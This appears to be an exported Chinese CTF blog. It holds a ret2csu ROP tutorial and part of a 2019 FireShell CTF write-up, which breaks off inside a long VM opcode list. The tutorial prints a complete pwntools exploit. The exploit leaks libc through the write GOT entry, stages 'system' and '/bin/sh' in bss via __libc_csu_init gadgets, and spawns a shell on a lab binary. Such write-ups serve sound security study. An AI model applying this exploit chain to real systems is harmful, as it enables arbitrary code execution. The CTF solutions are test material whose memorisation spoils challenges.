位的程序中，函数所调用的参数并不是全部在栈上，前六个参数分别位于rdi、rsi、rdx、rcx、r8和r9，其余参数则在栈上。同时，可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。所以 64 位的程序需要通过 rop 或者 libc 中的函数来设置参数。 分析程序程序给出的源码如下： 1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, \"Hello, World\\n\", 13); vulnerable_function();&#125; 只开了 NX，那么vulnerable_function()中的栈溢出是很显然的： 123456[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没有任何可辅助的函数，同时也找不到可用的 gadgets 来用，这里就要用到 libc 中的一个函数__libc_csu_init()： 1234567891011121314151617181920212223242526272829303132333435363738.text:00000000004005A0 mov [rsp+var_28], rbp.text:00000000004005A5 mov [rsp+var_20], r12.text:00000000004005AA lea rbp, cs:600E24h.text:00000000004005B1 lea r12, cs:600E24h.text:00000000004005B8 mov [rsp+var_18], r13.text:00000000004005BD mov [rsp+var_10], r14.text:00000000004005C2 mov [rsp+var_8], r15.text:00000000004005C7 mov [rsp+var_30], rbx.text:00000000004005CC sub rsp, 38h.text:00000000004005D0 sub rbp, r12.text:00000000004005D3 mov r13d, edi.text:00000000004005D6 mov r14, rsi.text:00000000004005D9 sar rbp, 3.text:00000000004005DD mov r15, rdx.text:00000000004005E0 call _init_proc.text:00000000004005E5 test rbp, rbp.text:00000000004005E8 jz short loc_400606.text:00000000004005EA xor ebx, ebx.text:00000000004005EC nop dword ptr [rax+00h].text:00000000004005F0.text:00000000004005F0 loc_4005F0: ; CODE XREF: __libc_csu_init+64↓j.text:00000000004005F0 mov rdx, r15.text:00000000004005F3 mov rsi, r14.text:00000000004005F6 mov edi, r13d.text:00000000004005F9 call qword ptr [r12+rbx*8].text:00000000004005FD add rbx, 1.text:0000000000400601 cmp rbx, rbp.text:0000000000400604 jnz short loc_4005F0.text:0000000000400606.text:0000000000400606 loc_400606: ; CODE XREF: __libc_csu_init+48↑j.text:0000000000400606 mov rbx, [rsp+38h+var_30].text:000000000040060B mov rbp, [rsp+38h+var_28].text:0000000000400610 mov r12, [rsp+38h+var_20].text:0000000000400615 mov r13, [rsp+38h+var_18].text:000000000040061A mov r14, [rsp+38h+var_10].text:000000000040061F mov r15, [rsp+38h+var_8].text:0000000000400624 add rsp, 38h.text:0000000000400628 retn 可以看到在loc_4005F0之后，有对第三个参数rdx、第二个参数rsi以及第一个参数rdi的mov操作。同时如果合理设置r12和rbx的大小，我们能够做到call某个函数。尾巴上还有mov栈上的值到一些寄存器中，仔细观察可以发现这和之前的参数也有一些联系。构造出一个csu()的函数。因为在第二次跳转上去后，还有一次add rsp, 0x38，所以需要在栈上再补 56 个 byte： 1234567891011121314151617181920212223# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): # function = r12 # rdi = r13, rsi = r14, rdx = r15 payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1) 编写 exp然后接下来的主要分为三步。第一步泄漏出write()函数的地址，以获取 libc： 123456789101112131415# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve)) 这里对 libc 的泄漏同样也可以通过DynELF来爆破： 123456789def leak(address): csu(0, 1, write_got, 1, address, 8, main_addr) data = p.recv(8) return data# leak libclog.info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')dynelf = DynELF(leak, elf=elf)system_addr = dynelf.lookup('system', 'libc') 拿到 libc 后可以获得system或者是execve的偏移。同时我们发现 bss 段可写，故接下来在 bss 段写入 system 的地址，以及字符串/bin/sh： 12345678# read(STDIN_FILENO, bss, 16)# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1) 最后一部只需要执行call已经写入的 system 并且将/bin/sh作为参数执行即可： 12345# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main) 整理一下，最后的 exp 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./level5')# p = remote('127.0.0.1',10001)elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']main = elf.symbols['main']bss = elf.bss()log.success('write_got = ' + hex(write_got))log.success('read_got = ' + hex(read_got))log.success('main = ' + hex(main))log.success('bss = ' + hex(bss))# gdb.attach(p)# 4005f0: 4c 89 fa mov rdx,r15# 4005f3: 4c 89 f6 mov rsi,r14# 4005f6: 44 89 ef mov edi,r13d# 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8]# 4005fd: 48 83 c3 01 add rbx,0x1# 400601: 48 39 eb cmp rbx,rbp# 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt;# 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8]# 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10]# 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18]# 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20]# 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28]# 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30]# 400624: 48 83 c4 38 add rsp,0x38# 400628: c3 retdef csu(rbx, rbp, r12, r13, r14, r15, ret_addr): payload = flat(['\\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\\x00' * 56, ret_addr]) # print repr(payload) p.recvuntil('Hello, World\\n') p.send(payload) sleep(1)# rdi = edi = r13, rsi = r14, rdx = r15# write(STDOUT_FILENO, write_got, 8);# r12 = write_got# rdi = 1, rsi = write_got, rdx = 8log.info('&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;')csu(0, 1, write_got, 1, write_got, 8, main)write = u64(p.recv(8).ljust(8, '\\x00'))log.success('write = ' + hex(write))libc = LibcSearcher('write', write)log.info('&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;')libc_base = write - libc.dump('write')system = libc_base + libc.dump('system')execve = libc_base + libc.dump('execve')log.success('libc_base = ' + hex(libc_base))log.success('system = ' + hex(system))log.success('execve = ' + hex(execve))# read(STDIN_FILENO, bss, 16);# r12 = read_got# rdi = 0, rsi = bss, rdx = 16log.info('&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;')csu(0, 1, read_got, 0, bss, 16, main)payload = flat([system, '/bin/sh\\x00'])p.send(payload)sleep(1)# execve(\"/bin/sh\"); or system(\"/bin/sh\");# r12 = execve/system# rdi = bss + 8 = \"/bin/sh\"log.info('&gt;&gt;&gt; EXECUTE execve(\"/bin/sh\") OR system(\"/bin/sh\") &lt;&lt;&lt;')csu(0, 1, bss, bss + 8, 0, 0, main)log.info('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() 做题的时候遇到的一个小 bug 是当传的 payload 中的无意义字符如果不为\\x00，最后跑 system 会坏掉，但是 execve 不会影响。如果将 buf 填充为\\x00，才可以执行 system。具体原因还没有弄清楚。 以下再补充一点关于__libc_csu_init()的点，也就是隐藏 gadgets： 也是 libc 设计时的一个 bug，不同的偏移下，还能够得到pop rdi ; ret和pop rsi ; pop r15 ; ret两个 gadgets： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061assassinq&gt;&gt; x/5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14assassinq&gt;&gt; x/5i 0x000000000040061B 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15assassinq&gt;&gt; x/5i 0x000000000040061C 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: retassassinq&gt;&gt; x/5i 0x000000000040061D 0x40061d &lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: retassassinq&gt;&gt; x/5i 0x000000000040061E 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x000000000040061F 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400622 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz retassassinq&gt;&gt; x/5i 0x0000000000400623 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz retassassinq&gt;&gt; quit 参考网站https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csuhttps://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.htmlhttps://www.jianshu.com/p/73fff078c19chttps://www.jianshu.com/p/a32dc72bb20f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"2019-FireShell-CTF","slug":"2019-FireShell-CTF","date":"2019-01-30T04:51:13.000Z","updated":"2019-08-26T01:16:38.971Z","comments":true,"path":"2019/01/30/2019-FireShell-CTF/","link":"","permalink":"qianfei11.coding.me/2019/01/30/2019-FireShell-CTF/","excerpt":"比赛没打，当作练习以及看着大佬的 writeup 复现了一下几道二进制。","text":"比赛没打，当作练习以及看着大佬的 writeup 复现了一下几道二进制。 REBlackbox-0先 file 一下： 12$ file Blackbox-0.exeBlackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows 运行程序： 1234This binary is a black box.This means that it was designed to be analyzed without looking it&apos;s inside contentsYou will solve the chalenge by letting the flag to be outputted in some way.You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment. 是.NET程序，故使用dnSpy来调试。在单步时，发现\\u000F\\u2009第 354 行返回一个变量text。 在这里设下断点，并多次继续后会得到一串 base64，解密得到 flag： Blackbox-1file 一下： 12$ file Blackbox-1.exeBlackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows 运行程序没有任何输出。同样因为是.NET程序，使用 dnSpy 调试。在\\u000F\\u2009第 358 行返回一个变量text： 在此处设置断点并多次继续，text的值会变成 flag： babyvm一道简单虚拟机。运行一下出现Program executed successfully!。先拖进 ida 查看 main 函数： 12345678910__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; while ( (_BYTE)end_sign ) &#123; get_option(); vm_start(); ++j; &#125; return 0LL;&#125; 第一个函数获取一个 option，然后进入vm_start()执行指令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int vm_start()&#123; void *__ptr32 *v0; // rax int v1; // eax int v2; // ST34_4 int v3; // eax int v4; // ST3C_4 int v5; // eax int v6; // ST28_4 int v7; // eax int v8; // ST30_4 int v9; // eax int v10; // ST1C_4 int v11; // eax int v12; // ST24_4 int v13; // eax int v14; // ST10_4 int v15; // eax int v16; // ST18_4 __int64 savedregs; // [rsp+40h] [rbp+0h] v0 = off_33D0; switch ( (unsigned int)&amp;savedregs ) &#123; case 0u: ++i; ++j; v0 = (void *__ptr32 *)buf; buf[i] = code[j]; break; case 1u: v1 = i--; v2 = buf[v1]; v3 = i--; v4 = buf[v3] + v2; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v4; break; case 3u: LOBYTE(end_sign) = 0; LODWORD(v0) = puts(\"Program executed successfully!\"); break; case 4u: v5 = i--; v6 = buf[v5]; v7 = i--; v8 = v6 * buf[v7]; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v8; break; case 5u: v9 = i--; v10 = buf[v9]; v11 = i--; v12 = buf[v11] / v10; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v12; break; case 6u: v13 = i--; v14 = buf[v13]; v15 = i--; v16 = buf[v15] - v14; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v16; break; default: return (signed int)v0; &#125; return (signed int)v0;&#125; 可以发现程序执行了内部的指令，没有任何与指令有关的输出。只管把指令 dump 出来，再把 switch 写出来复现一下： 12345678910111213141516171819202122232425262728293031323334353637383940code = [0x00000000, 0x00000046, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000343, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000016D5, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000016D5, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CD5B, 0x00000006, 0x00000002, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CDA1, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000000F5, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000149, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000066D, 0x00000000, 0x0000003E, 0x00000001, 0x00000000, 0x000006AB, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000705, 0x00000000, 0x00000026, 0x00000006, 0x00000000, 0x00000705, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000E0A, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x00000E0A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00008C64, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00034A58, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00170868, 0x00000000, 0x00000032, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000010, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00170845, 0x00000006, 0x00000002, 0x00000000, 0x00170868, 0x00000000, 0x00170868, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x0000003F, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000005C4, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000005ED, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000000C, 0x00000001, 0x00000000, 0x000005F9, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002FC8, 0x00000000, 0x00000050, 0x00000001, 0x00000000, 0x00003018, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C060, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000C085, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x0000C085, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0001810A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000F0A64, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001E14C8, 0x00000000, 0x0000001C, 0x00000001, 0x00000000, 0x001E14E4, 0x00000000, 0x001E1469, 0x00000006, 0x00000002, 0x00000000, 0x001E14E4, 0x00000000, 0x001E14E4, 0x00000006, 0x00000000, 0x00000043, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000014F, 0x00000000, 0x00000018, 0x00000006, 0x00000000, 0x0000014F, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000007DA, 0x00000000, 0x00000051, 0x00000001, 0x00000000, 0x0000082B, 0x00000000, 0x0000004F, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00004158, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00004159, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x000041A6, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000189E4, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC4F9, 0x00000006, 0x00000002, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC53C, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000249, 0x00000000, 0x00000047, 0x00000001, 0x00000000, 0x00000290, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x000002A2, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x000002A2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000017B2, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000017B2, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00001813, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00003026, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00003026, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C098, 0x00000000, 0x00000045, 0x00000006, 0x00000000, 0x0000C098, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000C0EA, 0x00000000, 0x00000037, 0x00000001, 0x00000000, 0x0000C121, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00030484, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00121B18, 0x00000000, 0x00121AA3, 0x00000006, 0x00000002, 0x00000000, 0x00121B18, 0x00000000, 0x00121B18, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00000046, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000008C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000003D4, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000016F8, 0x00000000, 0x00000003, 0x00000001, 0x00000000, 0x000016FB, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00002DF6, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x00002E56, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x00002EB5, 0x00000000, 0x00000013, 0x00000001, 0x00000000, 0x00002EC8, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00002EF7, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0001A6AF, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0001A6C7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x0001A700, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0001A743, 0x00000000, 0x0001A70E, 0x00000006, 0x00000002, 0x00000000, 0x0001A743, 0x00000000, 0x0001A743, 0x00000006, 0x00000000, 0x00000074, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00000099, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00000099, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000561, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000005C4, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002E20, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00002E45, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00002E99, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000E8FD, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x0000E939, 0x00000000, 0x00000040, 0x00000006, 0x00000000, 0x0000E939, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00048E1D, 0x00000000, 0x0000001F, 0x00000001, 0x00000000, 0x00048E3C, 0x00000000, 0x00000036, 0x00000001, 0x00000000, 0x00048E72, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00091CE4, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001239C8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x001239C8, 0x00000000, 0x00123954, 0x00000006, 0x00000002, 0x00000000, 0x001239C8, 0x00000000, 0x001239C8, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000040, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x00000064, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000320, 0x00000000, 0x00000047, 0x00000006, 0x00000000, 0x00000320, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x00000324, 0x00000000, 0x00000014, 0x00000001, 0x00000000, 0x00000338, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x00000338, 0x00000000, 0x00000044, 0x00000001, 0x00000000, 0x0000037C, 0x00000000, 0x0000005E, 0x00000001, 0x00000000, 0x000003DA, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00002684, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00009A10, 0x00000000, 0x0000000A, 0x00000001, 0x00000000, 0x00009A1A, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x00009A37, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00009A3F, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0004D1F8, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0009A3F0, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x0009A400, 0x00000000, 0x0000003B, 0x00000006, 0x00000000, 0x0009A400, 0x00000000, 0x0009A3D0, 0x00000006, 0x00000002, 0x00000000, 0x0009A400, 0x00000000, 0x0009A400, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x0000007D, 0x00000000, 0x0000000F, 0x00000001, 0x00000000, 0x0000008C, 0x00000000, 0x00000001, 0x00000006, 0x00000000, 0x0000008C, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x000000C8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000000C8, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00000129, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000A71, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000029C4, 0x00000000, 0x00000047, 0x00000006, 0x00000000, 0x000029C4, 0x00000000, 0x0000001E, 0x00000001, 0x00000000, 0x000029E2, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00007DA6, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00007DA6, 0x00000000, 0x00000058, 0x00000001, 0x00000000, 0x00007DFE, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000371F2, 0x00000000, 0x00000007, 0x00000001, 0x00000000, 0x000371F9, 0x00000000, 0x0000001B, 0x00000006, 0x00000000, 0x000371F9, 0x00000000, 0x00000017, 0x00000001, 0x00000000, 0x00037210, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00037211, 0x00000000, 0x000371A4, 0x00000006, 0x00000002, 0x00000000, 0x00037211, 0x00000000, 0x00037211, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000005F, 0x00000000, 0x0000003F, 0x00000001, 0x00000000, 0x0000009E, 0x00000000, 0x00000052, 0x00000006, 0x00000000, 0x0000009E, 0x00000000, 0x0000004A, 0x00000006, 0x00000000, 0x0000009E, 0x00000000, 0x0000002B, 0x00000001, 0x00000000, 0x000000C9, 0x00000000, 0x0000001F, 0x00000001, 0x00000000, 0x000000E8, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000000E8, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x000000E8, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00000658, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00000658, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00003918, 